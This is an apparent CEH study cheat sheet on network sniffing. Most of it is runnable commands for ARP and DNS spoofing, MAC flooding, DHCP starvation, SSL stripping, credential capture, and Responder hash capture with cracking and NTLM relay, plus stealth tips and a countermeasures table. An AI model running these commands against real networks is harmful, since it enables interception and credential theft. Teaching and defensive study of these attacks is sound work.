> For authorized security testing, red team exercises, and educational study only.

# Sniffing Attacks (CEH Module 08 — Network Sniffing)

Intercept and analyze network traffic to capture credentials, map network topology, and position for man-in-the-middle attacks.

## Passive vs Active Sniffing

```text
Passive Sniffing                          Active Sniffing
- Hub-based or SPAN/mirror port           - Switch-based, requires injection
- No packets injected                     - ARP poisoning, MAC flooding, etc.
- Hard to detect                          - Detectable by IDS/IPS
- Limited to broadcast domain             - Can redirect traffic across VLANs
```

```bash
# Passive capture on a hub or SPAN port
tcpdump -i eth0 -nn -w capture.pcap

# Promiscuous mode check
ip link show eth0 | grep PROMISC
```

## ARP Poisoning / Spoofing

```text
How it works:
1. Attacker sends gratuitous ARP replies (unsolicited)
2. Victim caches attacker's MAC for gateway IP
3. Gateway caches attacker's MAC for victim IP
4. All traffic flows through attacker (MITM position)

ARP is stateless — hosts accept replies they never requested.
```

```bash
# arpspoof (dsniff suite) — poison both directions
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1

# ettercap — ARP MITM with sniffing
ettercap -T -q -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//

# bettercap — modern ARP spoofing
bettercap -iface eth0
> set arp.spoof.targets 192.168.1.10
> arp.spoof on
> net.sniff on
```

## MAC Flooding

```text
CAM table overflow — switch has finite MAC address table (~8K-128K entries).
When full, switch fails open and broadcasts all frames like a hub.
```

```bash
# macof (dsniff suite) — flood switch CAM table
macof -i eth0
macof -i eth0 -n 100000            # limit packet count

# With custom source
macof -i eth0 -s 10.0.0.1 -d 10.0.0.2
```

## DHCP Starvation & Rogue DHCP

```bash
# Gobbler / DHCPig — exhaust DHCP pool
pig.py eth0                         # starve all leases

# Yersinia — DHCP starvation attack
yersinia dhcp -attack 1 -interface eth0

# After starvation, deploy rogue DHCP server
# to hand out attacker-controlled gateway/DNS
ettercap -T -q -i eth0 -P dhcp_spoof
```

```text
Attack flow:
1. Send DHCPDISCOVER with spoofed MACs, exhaust pool
2. Legitimate clients can't get leases
3. Start rogue DHCP server with attacker as gateway/DNS
4. New clients route through attacker
```

## DNS Spoofing / Poisoning

```bash
# dnsspoof (dsniff suite) — respond to DNS queries
echo "192.168.1.50  *.targetbank.com" > dns_hosts.txt
dnsspoof -i eth0 -f dns_hosts.txt

# ettercap DNS plugin
# Edit /etc/ettercap/etter.dns:
#   targetbank.com  A  192.168.1.50
#   *.targetbank.com  A  192.168.1.50
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.10// /192.168.1.1//

# bettercap DNS spoofing
bettercap -iface eth0
> set dns.spoof.domains targetbank.com
> set dns.spoof.address 192.168.1.50
> dns.spoof on
```

## Switch Port Security Bypass

```bash
# MAC spoofing — impersonate authorized MAC
ip link set eth0 down
ip link set eth0 address aa:bb:cc:dd:ee:ff
ip link set eth0 up

# macchanger
macchanger -m aa:bb:cc:dd:ee:ff eth0

# Double tagging / VLAN hopping
# Craft 802.1Q double-tagged frame (native VLAN -> target VLAN)
# Requires attacker on native VLAN of trunk port
scapy:
>>> sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="10.10.100.5")/ICMP())
```

## Packet Capture and Analysis

```bash
# tcpdump — BPF filter syntax
tcpdump -i eth0 -nn -X 'tcp port 80'
tcpdump -i eth0 'src host 10.0.0.5 and dst port 443'
tcpdump -i eth0 'tcp[13] & 2 != 0'              # SYN packets
tcpdump -i eth0 -w capture.pcap 'not port 22'   # exclude SSH

# tshark — Wireshark CLI
tshark -i eth0 -f 'port 80'                     # capture filter (BPF)
tshark -r capture.pcap -Y 'http.request'         # display filter
tshark -r capture.pcap -Y 'dns.qry.name contains "target"'
tshark -r capture.pcap -Y 'ftp' -T fields -e ftp.request.command -e ftp.request.arg

# Wireshark display filters
http.request.method == "POST"
tcp.flags.syn == 1 && tcp.flags.ack == 0
frame contains "password"
ip.addr == 192.168.1.0/24
```

## Credential Sniffing

```bash
# Cleartext protocols — capture credentials directly
# HTTP POST credentials
tshark -i eth0 -Y 'http.request.method == POST' -T fields \
  -e http.host -e http.request.uri -e urlencoded-form.value

# FTP credentials
tshark -i eth0 -Y 'ftp.request.command == USER || ftp.request.command == PASS' \
  -T fields -e ftp.request.arg

# Telnet session capture
tshark -i eth0 -Y 'telnet' -T fields -e telnet.data

# SMTP authentication
tshark -i eth0 -Y 'smtp.req.command == "AUTH"'

# ettercap automatic credential capture
ettercap -T -q -i eth0 -M arp:remote /target// /gateway//
# Captures: HTTP, FTP, Telnet, SMTP, POP3, IMAP, etc.
```

## SSL Stripping

```bash
# sslstrip — downgrade HTTPS to HTTP
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
sslstrip -l 8080 -w sslstrip.log

# bettercap SSL stripping
bettercap -iface eth0
> set http.proxy.sslstrip true
> http.proxy on
> arp.spoof on
> net.sniff on

# HSTS bypass attempts (limited effectiveness)
# bettercap caplets for HSTS bypass
> hstshijack/hstshijack     # rename domains to bypass HSTS
```

```text
Note: HSTS preload lists and certificate pinning make SSL stripping
increasingly difficult against modern browsers and apps.
```

## LLMNR / NBT-NS Poisoning

```bash
# Responder — poison LLMNR, NBT-NS, mDNS
responder -I eth0 -rdwv
# Captures NTLMv2 hashes when victims resolve nonexistent names

# Targeted — specific protocols only
responder -I eth0 -r -d -w        # LLMNR + NBT-NS + WPAD

# Crack captured hashes
hashcat -m 5600 hashes.txt wordlist.txt      # NTLMv2
john --format=netntlmv2 hashes.txt

# Relay instead of crack
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## Countermeasures

```text
Layer 2 Defense                         Purpose
-------------------------------------------------------------------
Dynamic ARP Inspection (DAI)            Validates ARP against DHCP snooping DB
DHCP Snooping                           Filters rogue DHCP; builds trusted binding table
Port Security                           Limits MACs per port; sticky MAC learning
802.1X (NAC)                            Authenticate before network access
VLAN best practices                     Change native VLAN; disable unused ports
Private VLANs                           Isolate hosts within same VLAN
```

```text
Higher-Layer Defense                    Purpose
-------------------------------------------------------------------
Encryption (TLS, SSH, IPsec)            Renders sniffed data unreadable
VPN                                     Encrypted tunnel for all traffic
HSTS + certificate pinning              Prevents SSL stripping
DNSSEC                                  Authenticates DNS responses
arpwatch / arpalert                     Monitors ARP table changes
Network segmentation                    Limits broadcast domain exposure
```

## Tips

- Always enable IP forwarding before ARP poisoning or packets will be dropped and the attack is immediately obvious.
- Use `arpwatch` on your own network to detect ARP spoofing — it logs MAC/IP pairing changes.
- MAC flooding is noisy and easily detected; prefer targeted ARP poisoning for stealth.
- Responder is one of the most effective tools on internal Windows networks — LLMNR/NBT-NS are enabled by default.
- On the CEH exam, know that passive sniffing = hub, active sniffing = switch (requires poisoning).
- BPF filters are applied at kernel level (capture filters) while Wireshark display filters are post-capture — capture filters are more efficient.

## See Also

- `sheets/security/network-defense.md`
- `detail/offensive/sniffing-attacks.md`

## References

- CEH v13 Module 08 — Sniffing
- EC-Council Certified Ethical Hacker Study Guide
- Wireshark Documentation: https://www.wireshark.org/docs/
- Bettercap Documentation: https://www.bettercap.org/
- Responder: https://github.com/lgandx/Responder
- tcpdump Manual: https://www.tcpdump.org/manpages/tcpdump.1.html
